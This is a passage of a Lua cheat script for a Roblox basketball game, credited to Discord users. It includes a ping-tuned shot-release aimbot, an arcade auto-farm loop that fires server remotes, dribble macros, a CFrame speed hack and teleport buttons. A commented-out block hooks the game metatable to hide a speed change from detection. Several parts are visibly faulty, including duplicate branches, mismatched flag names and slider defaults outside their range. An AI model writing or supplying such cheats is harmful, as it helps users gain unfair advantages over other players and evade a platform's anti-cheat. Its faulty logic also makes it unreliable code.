                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 170 then
                    print("170 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping170 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.435)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 165 then
                    print("165 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping165 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.435)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Release" ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 160 then
                    print("160 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping160 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.435)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Release" ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 155 then
                    print("155 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping155 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.44)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 150 then
                    print("150 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping145 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.44)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 145 then
                    print("145 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping145 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.46)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 140 then
                    print("140 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping140 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.46)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 140 then
                    print("140 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping140 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.46)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 135 then
                    print("135 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping135 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.47)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 130 then
                    print("130 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping130 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.48)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 125 then
                    print("125 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping125 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.48)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 120 then
                    print("120 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping120 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.48)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 115 then
                    print("115 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping90 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.49)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 110 then
                    print("110 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping110 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.49)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 105 then
                    print("105 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping105 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.49)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 100 then
                    print("100 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping100 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.51)-- default
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 95 then
                    print("95 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping95 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.512)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 90 then
                    print("90 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping90 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.513)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 85 then
                    print("85 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping85 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.514)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 80 then
                    print("80 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping80 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.516)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 75 then
                    print("75 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping75 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.518)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 70 then
                    print("70 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping70 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.52)-- default
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                
                elseif ping > 65 then
                    print("65 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping65 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.519)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                
                elseif ping > 60 then
                    print("60 ms")
                    --game:GetService("RunService").RenderStepped:Connect(function()
                    while getgenv().ping60 == true do wait()
                        for _, v in pairs(Humanoid:GetPlayingAnimationTracks()) do
                            if v.Animation.AnimationId == StandingAnim then
                                if Humanoid.MoveDirection.Magnitude == 0 then
                                    wait(0.516)
                                    if Toggles.standingaimbot.Value == true then
                                        keyrelease(0x45)
                                        wait(1.5)
                                        Library:Notify("Shot Release " ..
                                            game:GetService("Players").LocalPlayer.PlayerGui.GameUI.Main.ShotFeedback.Release.Text)
                                    
                                    end
                                end
                            end
                        end
                    end
                --end)
                end
            
            end
            if Toggles.standingaimbot.Value == false then
                local ping = nil
                getgenv().ping305 = false
                getgenv().ping300 = false
                getgenv().ping295 = false
                getgenv().ping290 = false
                getgenv().ping285 = false
                getgenv().ping280 = false
                getgenv().ping275 = false
                getgenv().ping270 = false
                getgenv().ping265 = false
                getgenv().ping260 = false
                getgenv().ping255 = false
                getgenv().ping250 = false
                getgenv().ping245 = false
                getgenv().ping240 = false
                getgenv().ping235 = false
                getgenv().ping230 = false
                getgenv().ping225 = false
                getgenv().ping220 = false
                getgenv().ping215 = false
                getgenv().ping210 = false
                getgenv().ping205 = false
                getgenv().ping200 = false
                getgenv().ping195 = false
                getgenv().ping190 = false
                getgenv().ping185 = false
                getgenv().ping180 = false
                getgenv().ping175 = false
                getgenv().ping170 = false
                getgenv().ping165 = false
                getgenv().ping160 = false
                getgenv().ping155 = false
                getgenv().ping150 = false
                getgenv().ping145 = false
                getgenv().ping140 = false
                getgenv().ping135 = false
                getgenv().ping130 = false
                getgenv().ping125 = false
                getgenv().ping120 = false
                getgenv().ping115 = false
                getgenv().ping110 = false
                getgenv().ping105 = false
                getgenv().ping100 = false
                getgenv().ping95 = false
                getgenv().ping90 = false
                getgenv().ping85 = false
                getgenv().ping80 = false
                getgenv().ping75 = false
                getgenv().ping70 = false
                getgenv().ping65 = false
                getgenv().ping60 = false
            end
        end)
        
        
        Toggles.standingaimbot:SetValue(false)
        
        local LeftGroupBoxxd = Tabs.Main:AddLeftGroupbox('$$ % Eladio Carrion % $$')
        
        LeftGroupBoxxd:AddToggle('autoarcade', {
            Text = 'Auto Arcade',
            Default = false,
            Tooltip = 'Auto Farm Auto Arcade' -- Information shown when you hover over the toggle
        })
        
        Toggles.autoarcade:OnChanged(function()
            if Toggles.autoarcade.Value == true then
                while Toggles.autoarcade.Value == true do
                    wait(0.01)
                    
                    local Event = game:GetService("Workspace")["Arcade Machine"].Remotes.Play
                    Event:FireServer()
                    
                    
                    
                    local Event = game:GetService("Workspace")["Arcade Machine"].Remotes.Pickup
                    Event:FireServer()
                    
                    local A_1 = true
                    local Event = game:GetService("Workspace")["Arcade Machine"].Remotes.Shoot
                    Event:FireServer(A_1)
                    
                    wait(0.5175)
                    
                    
                    local A_1 = false
                    local Event = game:GetService("Workspace")["Arcade Machine"].Remotes.Shoot
                    Event:FireServer(A_1)
                
                end
            end
            if Toggles.autoarcade.Value == false then
                
                end
        end)
        Toggles.autoarcade:SetValue(false)
        
        local RightGroupBox = Tabs.Main:AddRightGroupbox('$$ Macros Remapped $$')
        
        
        RightGroupBox:AddToggle('macroskeys', {
            Text = 'Activate Remapped Keys',
            Default = false,
            Tooltip = 'Macros para que sea mas facil dribblar'
        })
        
        Toggles.macroskeys:OnChanged(function()
            if Toggles.macroskeys.Value == true then
                
                end
            if Toggles.macroskeys.Value == false then
                
                end
        end)
        
        Toggles.macroskeys:SetValue(false)
        
        
        RightGroupBox:AddLabel('Spin Dribble'):AddKeyPicker('macrospin', {
            Default = 'B', -- String as the name of the keybind (MB1, MB2 for mouse buttons)
            SyncToggleState = true,
            
            
            Mode = 'Hold', -- Modes: Always, Toggle, Hold
            
            Text = 'Auto lockpick safes', -- Text to display in the keybind menu
            NoUI = false, -- Set to true if you want to hide from the Keybind menu,
        })
        
        Options.macrospin:OnClick(function()
            
            end)
        
        task.spawn(function()
            while true do
                wait(0)
                
                -- example for checking if a keybind is being pressed
                local state3 = Options.macrospin:GetState()
                if state3 then
                    if Toggles.macroskeys.Value == true then
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "ZXC"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "CXZ"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                    
                    end
                end
                if Library.Unloaded then break end
            end
        end)
        
        
        
        RightGroupBox:AddLabel('Behind Back Drible'):AddKeyPicker('behindback', {
            Default = 'V', -- String as the name of the keybind (MB1, MB2 for mouse buttons)
            SyncToggleState = true,
            Mode = 'Hold', -- Modes: Always, Toggle, Hold
            Text = 'Auto lockpick safes', -- Text to display in the keybind menu
            NoUI = false,
        })
        
        Options.behindback:OnClick(function()
            
            end)
        
        task.spawn(function()
            while true do
                wait(0)
                
                -- example for checking if a keybind is being pressed
                local state4 = Options.behindback:GetState()
                if state4 then
                    if Toggles.macroskeys.Value == true then
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "ZX"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "CX"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                    
                    end
                end
                if Library.Unloaded then break end
            end
        end)
        
        RightGroupBox:AddLabel('Double Crossover'):AddKeyPicker('doublecrossover', {
            Default = 'F', -- String as the name of the keybind (MB1, MB2 for mouse buttons)
            SyncToggleState = true,
            
            
            Mode = 'Hold', -- Modes: Always, Toggle, Hold
            
            Text = 'Auto lockpick safes', -- Text to display in the keybind menu
            NoUI = false, -- Set to true if you want to hide from the Keybind menu,
        })
        
        Options.doublecrossover:OnClick(function()
            
            end)
        
        task.spawn(function()
            while true do
                wait(0)
                
                -- example for checking if a keybind is being pressed
                local state5 = Options.doublecrossover:GetState()
                if state5 then
                    if Toggles.macroskeys.Value == true then
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "ZZ"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "CC"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                    
                    end
                end
                if Library.Unloaded then break end
            end
        end)
        
        RightGroupBox:AddLabel('Snatchback'):AddKeyPicker('snatchback', {
            Default = 'X', -- String as the name of the keybind (MB1, MB2 for mouse buttons)
            SyncToggleState = true,
            
            
            Mode = 'Hold', -- Modes: Always, Toggle, Hold
            
            Text = 'Auto lockpick safes', -- Text to display in the keybind menu
            NoUI = false, -- Set to true if you want to hide from the Keybind menu,
        })
        
        Options.snatchback:OnClick(function()
            
            end)
        
        task.spawn(function()
            while true do
                wait(0)
                
                -- example for checking if a keybind is being pressed
                local state5 = Options.snatchback:GetState()
                if state5 then
                    if Toggles.macroskeys.Value == true then
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "XX"
                        }
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                    
                    end
                end
                if Library.Unloaded then break end
            end
        end)
        
        RightGroupBox:AddLabel('Under Side'):AddKeyPicker('underside', {
            Default = 'Q', -- String as the name of the keybind (MB1, MB2 for mouse buttons)
            SyncToggleState = true,
            
            
            Mode = 'Hold', -- Modes: Always, Toggle, Hold
            
            Text = 'Auto lockpick safes', -- Text to display in the keybind menu
            NoUI = false, -- Set to true if you want to hide from the Keybind menu,
        })
        
        Options.underside:OnClick(function()
            
            end)
        
        task.spawn(function()
            while true do
                wait(0)
                
                -- example for checking if a keybind is being pressed
                local state7 = Options.underside:GetState()
                if state7 then
                    if Toggles.macroskeys.Value == true then
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "VZ"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "VC"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                    
                    end
                end
                if Library.Unloaded then break end
            end
        end)
        
        RightGroupBox:AddLabel('Under Back'):AddKeyPicker('underback', {
            Default = 'Z', -- String as the name of the keybind (MB1, MB2 for mouse buttons)
            SyncToggleState = true,
            
            
            Mode = 'Hold', -- Modes: Always, Toggle, Hold
            
            Text = 'Auto lockpick safes', -- Text to display in the keybind menu
            NoUI = false, -- Set to true if you want to hide from the Keybind menu,
        })
        
        Options.underback:OnClick(function()
            
            end)
        
        task.spawn(function()
            while true do
                wait(0)
                
                -- example for checking if a keybind is being pressed
                local state8 = Options.underback:GetState()
                if state8 then
                    if Toggles.macroskeys.Value == true then
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "VX"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                    end
                end
                if Library.Unloaded then break end
            end
        end)
        
        
        RightGroupBox:AddLabel('Under Front'):AddKeyPicker('underfront', {
            Default = 'C', -- String as the name of the keybind (MB1, MB2 for mouse buttons)
            SyncToggleState = true,
            
            
            Mode = 'Hold', -- Modes: Always, Toggle, Hold
            
            Text = 'Auto lockpick safes', -- Text to display in the keybind menu
            NoUI = false, -- Set to true if you want to hide from the Keybind menu,
        })
        
        Options.underfront:OnClick(function()
            
            end)
        
        task.spawn(function()
            while true do
                wait(0)
                
                -- example for checking if a keybind is being pressed
                local state9 = Options.underfront:GetState()
                if state9 then
                    if Toggles.macroskeys.Value == true then
                        local args = {
                            [1] = "Dribble Move",
                            [2] = "VV"
                        }
                        
                        workspace.GameEvents.ClientAction:FireServer(unpack(args))
                    end
                end
                if Library.Unloaded then break end
            end
        end)
        
        
        
        local RightGroupBox = Tabs.Main:AddRightGroupbox('$$ Speed Options $$')
        
        RightGroupBox:AddToggle('glidebooster', {
            Text = 'Glide Walk',
            Default = false,
            Tooltip = 'You are faster with this'
        })
        
        Toggles.glidebooster:OnChanged(function()
            if Toggles.glidebooster.Value == true then
                
                
                
                
                You = game.Players.LocalPlayer.Name
                UIS = game:GetService("UserInputService")
                
                while Toggles.glidebooster.Value == true do
                    if UIS:IsKeyDown(Enum.KeyCode.W) then
                        game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0, 0, -Options.glideslider.Value)
                    end;
                    if UIS:IsKeyDown(Enum.KeyCode.A) then
                        game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(-Options.glideslider.Value, 0, 0)
                    end;
                    if UIS:IsKeyDown(Enum.KeyCode.S) then
                        game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(0, 0, Options.glideslider.Value)
                    end;
                    if UIS:IsKeyDown(Enum.KeyCode.D) then
                        game:GetService("Workspace")[You].HumanoidRootPart.CFrame = game:GetService("Workspace")[You].HumanoidRootPart.CFrame * CFrame.new(Options.glideslider.Value, 0, 0)
                    end;
                    wait()
                end
            
            end
            if Toggles.glidebooster.Value == false then
                
                end
        end)
        
        Toggles.glidebooster:SetValue(false)
        
        RightGroupBox:AddSlider('glideslider', {
            Text = 'Glide Changer',
            
            Default = 0.3,
            Min = 0,
            Max = 0.09,
            Rounding = 3,
            
            Compact = true,
        })
        
        local Number = Options.glideslider.Value
        Options.glideslider:OnChanged(function()
            end)
        
        Options.glideslider:SetValue(0.06)
        
        local teleportsbox = Tabs.Main:AddLeftGroupbox('     $$ Teleports Options $$')
        
        local MyButton = teleportsbox:AddButton('Personal Gym', function()
                
                local A_1 = "Plaza"
                local Event = game:GetService("ReplicatedStorage").Remotes.Teleport
                Event:InvokeServer(A_1)
                
                local A_1 = "Personal Gym"
                local Event = game:GetService("ReplicatedStorage").Remotes.Teleport
                Event:InvokeServer(A_1)
        end)
        
        local MyButton2 = MyButton:AddButton('Practice', function()
            local A_1 = "Practice"
            local Event = game:GetService("ReplicatedStorage").Remotes.Teleport
            Event:InvokeServer(A_1)
        end)
        
        local MyButtonxd = teleportsbox:AddButton('Plaza', function()
            local A_1 = "Plaza"
            local Event = game:GetService("ReplicatedStorage").Remotes.Teleport
            Event:InvokeServer(A_1)
        end)
        
        local MyButton3 = MyButtonxd:AddButton('Park', function()
            local A_1 = "Plaza"
            local Event = game:GetService("ReplicatedStorage").Remotes.Teleport
            Event:InvokeServer(A_1)
            local A_1 = "Park"
            local Event = game:GetService("ReplicatedStorage").Remotes.Teleport
            Event:InvokeServer(A_1)
        end)
        
        local MyButtonxd3 = teleportsbox:AddButton('Main Menu', function()
            local A_1 = "Main Menu"
            local Event = game:GetService("ReplicatedStorage").Remotes.Teleport
            Event:InvokeServer(A_1)
        end)
        
        local MyButton4 = MyButtonxd3:AddButton('Rec-Center', function()
            local A_1 = "Rec"
            local Event = game:GetService("ReplicatedStorage").Remotes.Teleport
            Event:InvokeServer(A_1)
        end)
        
        local creditsbox = Tabs.Main:AddLeftGroupbox('         $$ Credits $$')
        
        creditsbox:AddLabel('<font color="#3da5ff">TheyRuslan#5657</font> - scripter')
        creditsbox:AddLabel('<font color="#de6cff">zldrako#5505</font> - contributor')
        
        --[[
        
        RightGroupBox:AddToggle('walikingrunning', {
        Text = 'Walking/Running Speed',
        Default = false,
        Tooltip = 'Dont enable this yet (DETECTED U CAN GET BANNED)' -- Information shown when you hover over the toggle
        })
        
        local youareapussy = game.Players.LocalPlayer.Character.Humanoid:GetAttributes()
        
        for i, v in pairs(youareapussy) do
        if i == "NormalSpeed" then
        DefaultNormalSpeed = v
        end
        end
        
        Toggles.walikingrunning:OnChanged(function()
        if Toggles.walikingrunning.Value == true then
        local gmt = getrawmetatable(game)
        setreadonly(gmt, false)
        local oldindex = gmt.__index
        gmt.__index = newclosure(function(self, b)
        if b == "NormalSpeed" then
        return DefaultNormalSpeed
        end
        return oldindex(self, b)
        end)
        
        game.Players.LocalPlayer.Character.Humanoid:SetAttribute('NormalSpeed', DefaultNormalSpeed + Options.speednormalwalkingslider.Value)
        end
        if Toggles.walikingrunning.Value == false then
        game.Players.LocalPlayer.Character.Humanoid:SetAttribute('NormalSpeed', DefaultNormalSpeed)
        end
        end)
        Toggles.walikingrunning:SetValue(false)
        
        RightGroupBox:AddSlider('speednormalwalkingslider', {
        Text = '',
        Default = 0.4,
        Min = 0,
        Max = 0.2,
        Rounding = 3,
        Compact = true,
        })
        
        local Number = Options.speednormalwalkingslider.Value
        Options.speednormalwalkingslider:OnChanged(function()
        
        end)
        
        Options.speednormalwalkingslider:SetValue(0.05)
        
        --]]
        local LeftGroupFPS = Tabs.Second:AddLeftGroupbox('$$ FPS Options $$')
        
        LeftGroupFPS:AddToggle('clearmap', {
            Text = 'Clear Map',
            Default = false,
            Tooltip = 'Activate highly recommended.' -- Information shown when you hover over the toggle
        })
        
        Toggles.clearmap:OnChanged(function()
            if Toggles.clearmap.Value == true then
                if game.PlaceId == 8657449735 then -- Personal GYM
                    pcall(function()
                        game:GetService("Workspace").Building.Parent = game:GetService("ReplicatedStorage")
                        game:GetService("Workspace")["Fake Plaza"].Parent = game:GetService("ReplicatedStorage")
                        game:GetService("ReplicatedStorage").Building.Carpet.Parent = game:GetService("Workspace")
                    end)
                end
                
                if game.PlaceId == 10107441386 then -- Park
                    pcall(function()
                        game:GetService("Workspace")["Fake Plaza"].Parent = game:GetService("Teams")
                        game:GetService("Workspace").Park["Path Walls"].Parent = game:GetService("Teams")
                        game:GetService("Workspace").Park.Benches.Parent = game:GetService("Teams")
